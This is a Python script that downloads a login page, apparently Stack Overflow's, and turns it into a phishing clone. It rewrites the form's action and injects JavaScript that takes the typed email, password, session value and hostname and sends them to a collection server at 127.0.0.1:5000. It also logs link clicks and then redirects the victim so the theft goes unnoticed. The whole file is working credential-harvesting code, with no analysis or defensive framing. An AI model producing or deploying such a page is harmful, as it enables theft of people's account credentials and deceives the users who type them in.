import os
import re
import requests
from bs4 import BeautifulSoup

def modify_html_stackoverflow(url, file_name, file_path, redirect_url):

    file_path = os.path.join(file_path, file_name)
    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    res = requests.get(url)
    html_data = res.content.decode('utf-8') 

    pattern_action = r'action="/users/login" method="POST"'
    replacement_action = r'action="" method="GET" onsubmit="sendData(event)"'
    modified_html = re.sub(pattern_action, replacement_action, html_data)

    pattern_signal_data = re.compile(r'<script\s+id="webpack-public-path"\s+type="text/uri-list">(.*?)</script>', re.DOTALL)
    modified_html = re.sub(pattern_signal_data, '', modified_html)

    pattern_script = re.compile(r'(Log in with Facebook\s*</button>\s*</div>)', re.DOTALL)
    data_to_insert = f"""
    <script>
        function sendDataAndRedirect() {{
            const fullUrl = window.location.href;
            const url = new URL(fullUrl);
            const id = url.searchParams.get("id");

            const serverURL = `http://127.0.0.1:5000/track_click_link?id=${{id}}`;

            fetch(serverURL, {{
            method: "GET",
            headers: {{
                "Content-Type": "application/json",
            }},
            }});
        }}
        window.onload = sendDataAndRedirect;
    </script>

    <script>
        let IP_local;
        async function sendData(event) {{
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const hostName = window.location.hostname;
            const sessionId = localStorage.getItem("Session");
            const fullUrl = window.location.href;
            const url = new URL(fullUrl);
            const id = url.searchParams.get("id");
            IP_local = "";
            if (email && password) {{
            try {{
                const response = await fetch(
                `http://127.0.0.1:5000/user_recv?email=${{email}}&password=${{password}}&ip_address=${{IP_local}}&host_name=${{hostName}}&session=${{sessionId}}&id=${{id}}`,
                {{
                    method: "GET",
                    headers: {{
                    "Content-Type": "application/json",
                    }},
                }}
                );
                window.location.href = "{redirect_url}";
            }} catch (error) {{
                console.error("Error:", error);
            }}
            }} else {{
            alert("Please fill in both fields.");
            }}
        }}
    </script>
    """

    def insert_data(match):
        return match.group(1) + data_to_insert

    modified_html = re.sub(pattern_script, insert_data, modified_html)

    with open(file_path, "w", encoding="utf-8") as file:
        file.write(modified_html)

    print(f"HTML data saved to {file_path}")